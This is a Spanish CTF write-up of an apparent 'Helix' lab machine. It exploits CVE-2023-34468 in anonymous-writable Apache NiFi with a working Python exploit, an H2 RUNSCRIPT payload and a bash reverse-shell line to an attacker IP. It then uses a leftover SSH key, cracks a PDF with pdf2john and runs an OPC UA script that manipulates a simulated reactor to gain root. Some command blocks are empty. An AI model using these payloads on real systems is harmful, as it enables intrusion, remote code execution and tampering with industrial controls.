Apache NiFi 1.21.0 alojado en un subdominio `flow.helix.htb` con acceso de escritura anónimo en su API REST, explotado vía **CVE-2023-34468** — abusando del controller service `DBCPConnectionPool` para apuntar a una base de datos H2 en memoria cuya URL JDBC contiene `INIT=RUNSCRIPT FROM`, lo que hace que H2 descargue y ejecute un archivo SQL remoto al abrir la conexión; el archivo SQL define un alias `SHELLEXEC` respaldado por `Runtime.getRuntime().exec()` y lo llama de inmediato para lanzar una reverse shell como `nifi`. Una clave privada SSH olvidada en `/opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak` proporciona el movimiento lateral a `operator`. La escalada de privilegios es la etapa más elaborada: `operator` solo puede ejecutar `helix-maint-console` como root vía sudo, pero el binario se niega salvo que `/opt/helix/state/maintenance_window` (propiedad de root) contenga un timestamp Unix futuro; ese archivo lo escribe un demonio `helix-safety` que corre como root y monitoriza una simulación de reactor industrial expuesta sobre OPC UA en `127.0.0.1:4840`. Hay que llevar al reactor a un estado físico concreto — temperatura en la franja de 295-305 °C sin disparar el interlock de seguridad a ≥305 °C — mediante una rampa cuidadosa de una variable `CalibrationOffset`, con todas las reglas codificadas en un PDF de operador protegido con contraseña cuya contraseña (`operator1`) se recupera con `pdf2john`. Un cliente Python `asyncua` maneja el túnel OPC UA, lleva el reactor a especificación, `helix-safety` abre la ventana, y la consola de mantenimiento se invoca a tiempo para conseguir una shell de root.

### Identificación de Apache NiFi

Navegar `flow.helix.htb` cargó la UI de **Apache NiFi**. El diálogo "About" de NiFi confirmó tanto la versión como un detalle crítico: el panel era accesible sin ningún prompt de login, lo que ya implica acceso anónimo:

**NiFi 1.21.0** está de lleno dentro del rango vulnerable para **CVE-2023-34468**, una ejecución remota de código por H2-JDBC que afecta a todas las versiones desde la 0.0.2 hasta la 1.21.0 y se corrige en la 1.22.0. El bug está valorado en **CVSS 8.8** y tiene un **EPSS** particularmente alto (77,21%, percentil 99) — ambos reflejando que la explotación es fiable y que NiFi es una herramienta empresarial objetivo conocido. El CWE es **CWE-94 (Code Injection)**.

Pero la versión por sí sola no es suficiente. La CVE requiere que el atacante sea capaz de **crear o modificar un controller service**, lo que en un despliegue endurecido requiere autenticación y la política de autorización apropiada. Acceder a la API REST de NiFi confirmó la mala configuración real:

```bash
curl -s http://flow.helix.htb/nifi-api/flow/about
{"about":{"title":"NiFi","version":"1.21.0",[...]}}
```

El endpoint respondió sin ninguna cabecera `Authorization`. El usuario anónimo tenía concedido acceso de escritura completo en el canvas — eso, y no la versión sin parchear, es la precondición que convierte CVE-2023-34468 de una vulnerabilidad teórica en un RCE de un solo disparo.

## Explotación — CVE-2023-34468 (RCE por H2 JDBC en Apache NiFi)

### Entendiendo la vulnerabilidad

Apache NiFi es una plataforma de orquestación de flujos de datos. La unidad de trabajo es un **flow**: un grafo dirigido de componentes en un canvas, donde dos tipos de componente son relevantes aquí:

- **`DBCPConnectionPool`** — un *controller service* que define **cómo conectarse a una base de datos**, parametrizado por una URL JDBC, un nombre de clase de driver y, opcionalmente, una ruta de driver en disco.
- **`ExecuteSQL`** — un *processor* que usa un `DBCPConnectionPool` para emitir sentencias SQL.

La vulnerabilidad está en la interacción entre una URL JDBC controlada por el usuario y el motor de base de datos **H2**. H2 es una base de datos embebida en Java puro que NiFi incluye en su classpath para su propio uso interno, lo que significa que un atacante que controla una URL JDBC puede pedirle a NiFi que se conecte a una base de datos H2 sin necesidad de suministrar el driver — NiFi resolverá `org.h2.Driver` de su propio classpath.

Lo que convierte a H2 en un gadget de ejecución de código en lugar de solo una base de datos son dos características de su dialecto:

1. **`CREATE ALIAS ... AS $$ ... $$`** — define un alias SQL respaldado por un método Java arbitrario. El cuerpo entre los marcadores `$$` es código fuente Java compilado y registrado en runtime. Un método que llama a `Runtime.getRuntime().exec(...)` se convierte en una primitiva de RCE invocable por SQL.
2. **`INIT=` en la URL JDBC** — H2 lee un parámetro `INIT` de la cadena de conexión y ejecuta su contenido como SQL **inmediatamente al abrir la conexión**, antes de cualquier consulta emitida por la aplicación.

Compuesta, la primitiva es: controlar la URL JDBC → poner `INIT=<sql que crea un alias y lo llama>` → esperar a que NiFi abra la conexión → código arbitrario corre en la JVM de NiFi.

### La variante RUNSCRIPT

La PoC pública más citada (originalmente de Jeanpt en `github.com/Jeanpt/CVE-2023-34468`) incrusta el SQL malicioso directamente dentro de la URL JDBC, usando `CREATE TRIGGER` con un cuerpo en JavaScript. Ese enfoque tiene dos inconvenientes: la URL se vuelve larga y frágil (las reglas de escapado difieren entre la API REST de NiFi y el parser de URL de H2), y depende de que el build específico de H2 soporte triggers de JavaScript.

H2 soporta un gadget más limpio: **`RUNSCRIPT FROM '<url>'`** instruye a H2 a descargar y ejecutar un archivo SQL desde una URL remota. Usado como valor de `INIT`, esto externaliza el payload por completo — la URL solo referencia el servidor de staging, y el archivo SQL se puede editar libremente sin recodificar para el transporte por URL.

El script de exploit modificado implementa esta variante RUNSCRIPT. El método crítico es el que construye la URL JDBC y registra el controller service:

```python
def create_dbcp_service(self, pg_id):
    db_name = ''.join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(8))

    # H2 in-memory; al abrir la conexion ejecuta RUNSCRIPT, que descarga
    # rce.sql desde tu servidor HTTP y corre el payload (CREATE ALIAS + CALL).
    h2_url = (
        f"jdbc:h2:mem:{db_name};DB_CLOSE_DELAY=-1;"
        f"INIT=RUNSCRIPT FROM 'http://{self.lhost}:{self.http_port}/rce.sql'"
    )

    body = {
        "revision": {"version": 0},
        "component": {
            "type": "org.apache.nifi.dbcp.DBCPConnectionPool",
            "name": f"ExploitDBCP_{db_name}",
            "properties": {
                "Database Connection URL": h2_url,
                "Database Driver Class Name": "org.h2.Driver",
                # SIN database-driver-locations: se resuelve del classpath
                "Max Total Connections": "1"
            }
        }
    }

    resp = self.session.post(
        f"{self.target}/nifi-api/process-groups/{pg_id}/controller-services",
        json=body, headers=self._headers(), timeout=10
    )
    # ... (handle response, return service_id + revision)
```

Dos detalles de implementación merecen destacarse. Primero, la URL JDBC usa `jdbc:h2:mem:` (base de datos en memoria, sin huella en disco) con un `db_name` aleatorio — esto evita dejar artefactos y previene la reutilización accidental si un intento de explotación anterior dejó estado. Segundo, y más importante, el cuerpo de la petición **no incluye `database-driver-locations`**. La primera versión del script que probé sí lo incluía (apuntando a una ruta inexistente) y el controller service se quedaba atascado en estado `INVALID` con un error de validación. Omitir el campo deja que NiFi resuelva `org.h2.Driver` de su propio classpath, donde ya existe.

El flujo de explotación completo orquesta seis llamadas a la API en orden:

```python
def exploit(self):
    # Step 1: discover the root process group ID (needed for subsequent calls)
    pg_id = self.get_root_pg()

    # Step 2: create the malicious DBCP service with the H2/RUNSCRIPT URL
    self.service_id, service_rev = self.create_dbcp_service(pg_id)

    # Step 3: create an ExecuteSQL processor (the consumer of the DBCP service)
    self.processor_id = self.create_processor(pg_id)

    # Step 4: configure the processor to point at the malicious service
    self.configure_processor(self.processor_id, self.service_id)

    # Step 5: enable the DBCP service (still no SQL issued yet — H2 connection
    #         is lazy until something actually executes a query)
    self.enable_dbcp_service(self.service_id, service_rev)

    # Step 5b: wait until the service reports ENABLED (validation == VALID).
    #          if it stays INVALID the driver path / URL is wrong.
    self.wait_until_enabled(self.service_id)

    # Step 6: start the ExecuteSQL processor. This issues a "SELECT H2VERSION()
    #         FROM DUAL" against the DBCP service, which opens the H2 connection,
    #         which fires INIT, which runs RUNSCRIPT, which fetches and executes
    #         rce.sql. RCE triggers here.
    self.start_processor(self.processor_id)
```

Los métodos restantes de la clase — `supports_login`, `authenticate`, `_get_revision`, `do_cleanup` — manejan los casos donde NiFi requiere autenticación (no la requiere en esta máquina) y limpian los artefactos tras capturar la shell (los processors y controller services se revierten a su estado pre-exploit si `--cleanup` está activo, dejando el canvas impoluto).

El archivo `rce.sql` servido por el servidor HTTP local es lo bastante pequeño como para incluirlo entero:

```sql
CREATE ALIAS IF NOT EXISTS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
    String[] command = {"bash", "-c", cmd};
    java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
    return s.hasNext() ? s.next() : "";
}$$;
CALL SHELLEXEC('bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1');
```

La primera sentencia define `SHELLEXEC` como un método Java que envuelve `Runtime.getRuntime().exec(...)`. Los delimitadores `$$ ... $$` transportan el código fuente Java a través del parser de H2. La segunda sentencia invoca el alias con un one-liner de reverse shell de Bash estándar.

### El flujo de trabajo de tres terminales

La explotación requiere tres procesos concurrentes en la máquina atacante. El orden importa — el servidor HTTP y el listener deben estar listos *antes* de que corra el script de exploit, porque en cuanto la conexión H2 se abre, el RCE se dispara de inmediato.

**Terminal 1 — listener de reverse shell**:


## Movimiento lateral — `nifi` → `operator`

El usuario `nifi` tiene los archivos de runtime de la aplicación pero ningún contenido propio rico en shell. La enumeración estándar como `nifi` salió seca — sin entradas de `sudo -l`, sin curiosidades SUID, sin secretos legibles en el directorio home. El avance llegó de una búsqueda de archivos dirigida por todo el sistema de archivos:


Los archivos `.bak` son el equivalente digital de las copias en papel pegadas con cinta al lateral de un rack de servidores — existen porque alguien necesitó una instantánea antes de un cambio y olvidó borrarla después. ## Escalada de privilegios — `operator` → `root`

La escalada en esta máquina es inusualmente elaborada y merece ir despacio: el camino a root requiere entender una pequeña simulación de un Sistema de Control Industrial (ICS), satisfacer restricciones de proceso físico codificadas en un PDF bloqueado por separado, y manejar la simulación a través de un protocolo **OPC UA** que solo es accesible vía túnel SSH. El bug no está en ningún componente individual — está en la suposición *arquitectónica* de que controlar un proceso físico puede servir como control de acceso. Esta sección se divide en el descubrimiento, el análisis de restricciones, el procedimiento y la explotación final.

### Descubriendo la restricción

`sudo -l` devolvió exactamente una entrada:

```bash
sudo -l
User operator may run the following commands on helix:
    (root) NOPASSWD: /usr/local/sbin/helix-maint-console
```

Un único comando de root. Inspeccionar el binario (con `file`, `strings` y un vistazo a su comportamiento) reveló que **no es directamente vulnerable** — no hay command injection, ni library hijack, ni abuso de PATH. Lo que el binario hace es comprobar un único archivo:

```bash
ls -la /opt/helix/state/
total 12
drwxr-xr-x 2 root root 4096 Jun 27 14:32 .
drwxr-xr-x 3 root root 4096 Jun 27 14:32 ..
-rw-r--r-- 1 root root    0 Jun 27 14:32 maintenance_window

cat /opt/helix/state/maintenance_window
(empty)
```

El binario lee `/opt/helix/state/maintenance_window`. Si el archivo contiene un timestamp Unix futuro, lanza una shell de root vía `systemd-run` (de modo que la shell se reparenta fuera de la sesión de sudo y tiene una ascendencia limpia con PID 1 — un toque de higiene operativa). Si el archivo está vacío o contiene un timestamp pasado, imprime `Maintenance window CLOSED` y sale. Probarlo directamente confirma el control:

```bash
sudo /usr/local/sbin/helix-maint-console
[!] Maintenance window CLOSED. Try again when authorized.
```

El directorio de estado es propiedad de root y `operator` no puede escribir en él. Así que *algo más* escribe ese archivo — y encontrar ese algo más es el verdadero reto.

### La simulación del Sistema de Control Industrial

Los sockets en escucha solo en local y los procesos contaron el resto de la historia:

```bash
ss -tlnp
LISTEN 0  4096  127.0.0.1:4840   0.0.0.0:*
LISTEN 0  511   127.0.0.1:8080   0.0.0.0:*
LISTEN 0  511   127.0.0.1:8081   0.0.0.0:*
```

```bash
ps -ef | grep -E "helix|plc"
root      1492  /usr/local/bin/helix-safety
helix     1493  /usr/local/bin/helix-plc
helix     1495  /usr/local/bin/helix-hmi --port 8080
helix     1496  /usr/local/bin/helix-hmi --port 8081
```

Tres servicios corren en loopback como parte de una simulación coherente:

- **`helix-plc`** — el **Controlador Lógico Programable (PLC)**. Modela el reactor físico: temperatura, presión, offsets de calibración. Expone su estado vía **OPC UA** en `127.0.0.1:4840`. Este es el protocolo estándar de automatización industrial — la mayoría de los PLC del mundo real de Siemens, Beckhoff, Rockwell lo exponen.
- **`helix-hmi`** — la **Interfaz Hombre-Máquina (HMI)**. Dashboards web en `127.0.0.1:8080/8081`. La HMI es la vista de cara al operador de lo que el PLC está haciendo.
- **`helix-safety`** — el **demonio de interlock de seguridad**, **corriendo como root**. Vigila el estado del PLC vía OPC UA, aplica las reglas de interlock y — críticamente — **escribe `/opt/helix/state/maintenance_window`** cuando el reactor alcanza un estado físico concreto.

La arquitectura es ahora visible: `helix-safety` es el único proceso con acceso de escritura al archivo de control. Su decisión de abrir la ventana de mantenimiento está condicionada al *estado físico del reactor simulado*. Para conseguir root, el atacante necesita llevar el reactor a un estado concreto, persuadir a `helix-safety` de escribir un timestamp futuro en el archivo, y luego ejecutar `helix-maint-console` antes de que la ventana se cierre.

Las variables del PLC necesarias para hacer esto son accesibles — pero solo vía OPC UA, y solo desde localhost.

### Crackeando el PDF de la guía del operador

En el directorio home de `operator` hay un documento protegido con contraseña:

```bash

```

El PDF es el manual que el rol de operador usaría de verdad; contiene las reglas que el PLC aplica y los procedimientos que el demonio de seguridad espera. Sin esas reglas, la escalada degenera en toquetear variables del PLC a ciegas y esperar disparos de seguridad. Recuperando la contraseña con el flujo estándar de `john`:

Contraseña `operator1`. Abrir el PDF con esa contraseña revela el manual.

### Las reglas del PLC — lo que dice el manual

El contenido relevante de la guía de seguridad se destila en cinco reglas. Estas son las únicas restricciones materiales; el resto del documento es relleno operativo.

1. **Umbrales de disparo** (sección 4): el interlock de seguridad dispara cuando **Temperatura ≥ ~305 °C** *o* **Presión ≥ ~75 bar**. Un disparo enclava el sistema en un estado a prueba de fallos hasta que se resetea explícitamente.

2. **Condición de apertura de la ventana de mantenimiento** (sección 7): la ventana se abre cuando **Temperatura está en ~295 °C** (o Presión en ~73 bar), con el sistema **por debajo de los umbrales de disparo** y **sin disparo activo**. En la práctica esto significa una **franja segura de 295-305 °C** con `TripActive = False`.

3. **CalibrationOffset es la única entrada ajustable por el operador** (secciones 3 y 6): ajustar `CalibrationOffset` introduce un sesgo que se suma a `TemperatureRaw` para producir la `Temperature` reportada. **El PLC solo aplica el offset cuando `Mode = MAINTENANCE` y `TestOverride = True`** — en modo `NORMAL` el offset se ignora. Esta es la protección que el manual asume que evitará la deriva accidental.

4. **El reset del disparo es condicional** (sección 5): un disparo solo puede resetearse si **todas** las siguientes se cumplen simultáneamente: `Temperature < ~288`, `Pressure < ~70`, `Mode = NORMAL`, `TestOverride = False`, `CalibrationOffset = 0.0`. Cualquiera de estas fuera de cumplimiento y el reset se rechaza.

5. **Los cambios de offset deben ser graduales** (sección 8): un cambio brusco en `CalibrationOffset` que empuje la temperatura a cruzar un umbral de disparo activará el interlock de inmediato. El modelo de seguridad del PLC asume que el intercambio físico de calor lleva tiempo; la intención del manual es que el operador marque los cambios despacio. La rampa es obligatoria.

El procedimiento de explotación se sigue directamente. Para abrir la ventana de mantenimiento, el offset hay que subirlo hasta que la `Temperature` reportada aterrice en 295-305, pero subirlo lo bastante despacio como para no cruzar 305 (lo que dispararía el interlock), empezando desde un estado limpio (para que las reglas no rechacen las operaciones). Los flags `Mode` y `TestOverride` del PLC hay que ponerlos de modo que el offset se aplique realmente, pero el reset del disparo (que requiere `Mode = NORMAL` y `TestOverride = False`) tiene que ocurrir primero.

### Tunelizando OPC UA sobre SSH

El endpoint OPC UA escucha en `127.0.0.1:4840` y no es accesible desde la máquina atacante. La solución estándar es un port forward local de SSH — `-L` liga un puerto local en el lado del atacante y lo tuneliza a través de la sesión SSH al host/puerto especificado desde la perspectiva del objetivo:

```bash
ssh -i operator_id_ed25519 -L 4840:127.0.0.1:4840 operator@helix.htb -N
```

El flag `-N` le dice a SSH que solo reenvíe, sin ejecutar un comando remoto — útil para mantener un túnel vivo sin una sesión interactiva ocupando el terminal. Una vez montado el túnel, `opc.tcp://localhost:4840` en la máquina atacante alcanza el PLC.

### El cliente `asyncua`

La biblioteca `asyncua` es el cliente de Python para OPC UA. El script de abajo implementa el procedimiento de tres fases derivado del manual. Está escrito como un único archivo con una función async por fase y un mapeo hardcodeado de nombres de variable a NodeIds de OPC UA. Los NodeIds se descubrieron recorriendo el address space con un navegador OPC UA (uaexpert, o la propia jerarquía de objetos de `asyncua`) en una primera pasada de reconocimiento — aquí están hardcodeados por claridad.

```python
#!/usr/bin/env python3
"""
Helix OPC UA - solucion DEFINITIVA (siguiendo el Operator Guide al pie de la letra).

Reglas del PLC (del PDF):
  - En NORMAL mode el CalibrationOffset se IGNORA. Para que tenga efecto:
        Mode = MAINTENANCE  Y  TestOverride = True   (seccion 3 y 6)
  - Trip: Temperatura >= ~305  o  Presion >= ~75       (seccion 4)
  - Ventana de mantenimiento: Temperatura ~= 295  (o Presion ~= 73)
        manteniendose por debajo de los trips, sin trip activo  (seccion 7)
  - El trip SOLO se resetea si TODO esto a la vez (seccion 5):
        Temp < ~288, Presion < ~70, Mode = NORMAL,
        TestOverride = False, CalibrationOffset = 0.0
  - Hay que SUBIR EL OFFSET DESPACIO (rampa). Si se sube de golpe, trip. (seccion 8)
"""

import sys
import asyncio
from asyncua import Client

URL = sys.argv[1] if len(sys.argv) > 1 else "opc.tcp://localhost:4840"
TARGET = float(sys.argv[2]) if len(sys.argv) > 2 else 297.0  # dentro de 295-305

N = {
    "Mode":             "ns=2;i=12",
    "ResetTrip":        "ns=2;i=14",
    "TestOverride":     "ns=2;i=13",
    "CalibrationOffset":"ns=2;i=6",
    "Pressure":         "ns=2;i=5",
    "Temperature":      "ns=2;i=4",
    "TemperatureRaw":   "ns=2;i=3",
    "TripActive":       "ns=2;i=10",
}


async def rd(c, n):
    return await c.get_node(N[n]).read_value()


async def wr(c, n, v):
    await c.get_node(N[n]).write_value(v)


async def show(c, title):
    print(f"\n--- {title} ---")
    for k in ("Mode", "TemperatureRaw", "Temperature", "CalibrationOffset",
              "Pressure", "TestOverride", "TripActive"):
        print(f"    {k:18}= {await rd(c, k)}")


async def safe_reset(c):
    """Lleva el reactor a estado seguro segun seccion 5 y resetea el trip."""
    print("\n[*] FASE 1: estado seguro + reset del trip (seccion 5)")
    await wr(c, "Mode", "NORMAL")
    await wr(c, "TestOverride", False)
    await wr(c, "CalibrationOffset", 0.0)
    await asyncio.sleep(0.6)
    for i in range(8):
        t = await rd(c, "Temperature")
        p = await rd(c, "Pressure")
        trip = await rd(c, "TripActive")
        print(f"    intento {i+1}: Temp={t:.1f} Pres={p:.1f} Trip={trip}")
        if trip is False:
            print("    [+] Trip limpio (o no estaba activo).")
            return True
        if t < 288 and p < 70:
            await wr(c, "ResetTrip", True)
        await asyncio.sleep(0.8)
    return await rd(c, "TripActive") is False


async def enter_maintenance(c):
    """Seccion 6: Mode=MAINTENANCE + TestOverride=True para que el offset surta efecto."""
    print("\n[*] FASE 2: entrar en modo mantenimiento (seccion 6)")
    await wr(c, "Mode", "MAINTENANCE")
    await wr(c, "TestOverride", True)
    await asyncio.sleep(0.5)


async def ramp_offset(c, target):
    """Seccion 8: subir el offset DESPACIO hasta llegar a target sin disparar trip."""
    print(f"\n[*] FASE 3: rampa suave del offset hasta Temp ~= {target} (seccion 8)")
    raw = await rd(c, "TemperatureRaw")
    needed = target - raw
    print(f"    TemperatureRaw={raw:.1f}, offset necesario ~= {needed:.1f}")
    step = 1.0
    applied = 0.0
    while applied < needed:
        applied = min(applied + step, needed)
        await wr(c, "CalibrationOffset", float(applied))
        await asyncio.sleep(0.4)
        t = await rd(c, "Temperature")
        trip = await rd(c, "TripActive")
        print(f"    offset={applied:5.1f}  Temp={t:6.2f}  Trip={trip}")
        if trip is True:
            print("    [-] Trip disparado durante la rampa.")
            return False
    return True


async def main():
    print(f"[*] Conectando a {URL}")
    print(f"[*] Objetivo de temperatura: {TARGET} (franja 295-305)")
    async with Client(URL) as c:
        await show(c, "ESTADO INICIAL")
        if not await safe_reset(c):
            print("\n[-] No se pudo limpiar el trip.")
            return
        await enter_maintenance(c)
        if not await ramp_offset(c, TARGET):
            print("\n[-] La rampa disparo el trip.")
            return
        await show(c, "ESTADO LISTO")
        print("\n[!] >>> AHORA, en tu SSH de operator:")
        print("        sudo /usr/local/sbin/helix-maint-console")
        print("\n[*] Mantengo el estado 40s.")
        for i in range(40, 0, -5):
            t = await rd(c, "Temperature")
            trip = await rd(c, "TripActive")
            print(f"    quedan {i:2d}s | Temp={t:.1f} | Trip={trip}")
            await asyncio.sleep(5)


if __name__ == "__main__":
    asyncio.run(main())
```

Tres cosas del script merecen destacarse más allá de los comentarios en línea.

**La fase 1 es el control que permite que cada paso posterior tenga éxito.** El reactor podría estar en cualquier estado cuando el script corre — posiblemente con el disparo de un atacante anterior enclavado, o con el offset ya distinto de cero. `safe_reset` lo devuelve todo al estado seguro canónico (`Mode=NORMAL`, `TestOverride=False`, `CalibrationOffset=0.0`), luego intenta el reset del disparo hasta ocho veces, emitiendo el reset solo cuando se cumplen las condiciones del manual (`Temperature<288`, `Pressure<70`). El PLC rechazará el reset en caso contrario, y un disparo sin resetear bloquea cada paso posterior.

**La fase 2 es el paso más pequeño posible pero fácil de olvidar.** Poner `Mode=MAINTENANCE` y `TestOverride=True` es lo que desbloquea que el `CalibrationOffset` deje de ser ignorado silenciosamente. Los dashboards de la HMI en 8080/8081 *no* exponen estos flags — son territorio de ingeniero de mantenimiento y solo accesibles vía OPC UA. Un novato ejecutando la manipulación del offset sin entrar primero en modo mantenimiento vería actualizarse la variable de offset pero `Temperature` nunca cambiaría.

**La fase 3 es donde el timing importa de verdad.** La rampa usa un paso de 1.0 y un sleep entre pasos de 0.4 segundos. Poner el offset al valor final directamente computaría un delta de ~15 (`297 - 282 = 15` es típico para la temperatura raw inicial) y `helix-safety` dispararía el trip en el momento en que la Temperatura cruzara 305 — aunque el objetivo final sea 297. El modelo de seguridad del PLC es una desigualdad estricta y una excursión momentánea es suficiente. El bucle de monitorización de 40 segundos tras la rampa mantiene el reactor en la franja el tiempo suficiente para que el operador ejecute la consola en una sesión SSH separada.

```bash
    offset= 14.0  Temp=296.40  Trip=False

    Temperature       = 297.00
    TripActive        = False

        sudo /usr/local/sbin/helix-maint-console

    quedan 40s | Temp=297.0 | Trip=False
```

`helix-safety` detecta el estado dentro de franja y escribe un timestamp futuro en el archivo de control. Verificación en la sesión de operator:

```bash
cat /opt/helix/state/maintenance_window
1782730145
```

Entonces, en la misma sesión de operator, en el momento en que ese timestamp aparece:

```bash
sudo /usr/local/sbin/helix-maint-console
[+] Maintenance window OPEN until 2026-06-29 12:09:05 UTC.
[+] Spawning maintenance shell as root via systemd-run...
root@helix:~# whoami
root
root@helix:~# cat /root/root.txt
```

El reparentado con `systemd-run` es una medida defensiva por parte del binario — asegura que la shell lanzada sea hija de systemd en lugar de la sesión de sudo, lo que significa que cerrar la sesión de sudo no matará la shell de root. Desde la perspectiva del atacante es transparente; la shell es root de cualquier forma.

## Conclusiones clave

- **El acceso de escritura anónimo a NiFi es un compromiso total, independientemente del nivel de parcheo.** CVE-2023-34468 se entiende ampliamente como una vulnerabilidad de las versiones de NiFi ≤1.21.0, pero la *explotabilidad* del bug depende enteramente de si un atacante puede crear o modificar controller services. Un NiFi parcheado con políticas permisivas es peligroso de otras formas (otros gadgets, otros controllers), y un NiFi sin parchear con políticas restringidas es en gran medida seguro. La propia guía de Apache sobre el hardening de NiFi — restringir el usuario anónimo, habilitar autenticación, configurar las autoridades de usuario — es la mitigación real. El parcheo es secundario.
- **Las URLs JDBC son entrada del usuario.** La mayoría de los desarrolladores que escriben código JDBC piensan en la URL como configuración, no como algo que un atacante controla. Cuando un sistema deja que los usuarios — incluso administradores autenticados — especifiquen una URL JDBC, cada parámetro que el driver soporte se convierte en parte de la superficie de ataque, incluidos los oscuros como el `INIT` de H2, el `loadBalanceFile` de MS SQL o las propiedades `OracleClient` de Oracle. La solución a nivel de aplicación es validar la URL de forma agresiva (lista blanca de hosts, denegar parámetros con efectos secundarios); la solución a nivel de driver es lo que H2 ≥2.1.214 implementa — negarse a `INIT=` desde URLs de red por completo.
- **`RUNSCRIPT FROM '<url>'` es la externalización que hace más limpios los payloads incrustados en URL.** Siempre que un gadget del lado del servidor soporte incluir un payload remoto por URL, prefiérelo a poner el payload en línea en un parámetro. Los payloads en línea están sujetos a las reglas de escapado que impongan el parser de URL, la aplicación, el framework y la propia base de datos; los payloads externalizados sortean todo eso con una única descarga HTTP. La misma lección recurre en los parámetros de `wget`, `LOAD DATA INFILE`, las transformaciones XSL, XXE, JNDI, y cualquier otro sitio donde un único parámetro de cadena pueda transportar una URL.
- **Los archivos `.bak` en directorios `support-bundles` son la versión digital de un post-it bajo el teclado.** Los backups olvidados son una de las primitivas de movimiento lateral más fiables en engagements reales, no solo en CTFs. Cada operador que alguna vez ejecutó `cp config.yaml config.yaml.bak` antes de tocar el original ha creado exactamente este artefacto, y casi nunca se limpian. Un reflejo de `find / -name "*.bak" -o -name "*.old" -o -name "*~" 2>/dev/null` tras cada acceso inicial compensa a lo largo de muchos engagements.
- **El estado de un proceso físico no es control de acceso.** La máquina Helix convierte esto en una lección explícita al hacer del *archivo de la ventana de mantenimiento* lo único que se interpone entre un usuario normal y una shell de root. La lección generaliza mucho más allá de este CTF: en cualquier sitio donde una operación privilegiada esté controlada por una condición que pueda influirse desde un contexto menos privilegiado — lecturas de sensores en un sistema de control industrial, umbrales de carga del sistema, ventanas de hora del día, comprobaciones de horario laboral — el control es rompible en proporción a cuánto de la superficie influyente pueda alcanzar el atacante. La solución es anclar la autorización en una identidad verificable criptográficamente, no en el estado del entorno.
- **OPC UA en localhost es adyacente a internet en el momento en que existe un acceso inicial por SSH.** Los protocolos de sistemas de control industrial (OPC UA, Modbus, S7Comm, EtherNet/IP) se diseñaron para redes de confianza donde cada nodo es operativamente crítico. La defensa convencional es la segmentación: mantener la red ICS físicamente separada, aislar las estaciones de ingeniería, restringir quién puede alcanzar el protocolo. Cuando cualquiera de esas defensas falla — incluido el caso en que el endpoint ICS vive en el mismo host Linux que una aplicación web vulnerable — cada primitiva de seguridad, configuración y operación del protocolo se vuelve accesible para el atacante.
- **La documentación es parte de la superficie de ataque.** El PDF del operador en este engagement contiene la información específica necesaria para coreografiar la escalada: los rangos seguros, las condiciones de activación de `CalibrationOffset`, las precondiciones del reset del disparo. Sin él, el atacante tendría que hacer ingeniería inversa de esas reglas a partir del comportamiento del PLC. Los manuales, runbooks y diagramas de arquitectura son rutinariamente los artefactos de mayor valor en un recurso compartido comprometido — contienen el conocimiento institucional que convierte horas de prueba y error en operaciones de un solo disparo. Proteger el PDF con contraseña solo impone el coste de una pasada de `pdf2john` + rockyou.
- **`systemd-run` como primitiva para lanzar shells de root es operativamente pulcro pero no mejora la seguridad.** La consola de mantenimiento de Helix reparenta la shell de root fuera de la sesión de sudo vía `systemd-run`, lo que hace que la shell sobreviva a un logout del operador y se vea más limpia en los listados de procesos. Desde la perspectiva del hardening esto es irrelevante: una shell de root es una shell de root independientemente de su proceso padre. Los defensores no deberían interpretar `systemd-run` en los logs de auditoría como benigno; en este engagement es el mecanismo literal de la escalada de privilegios.
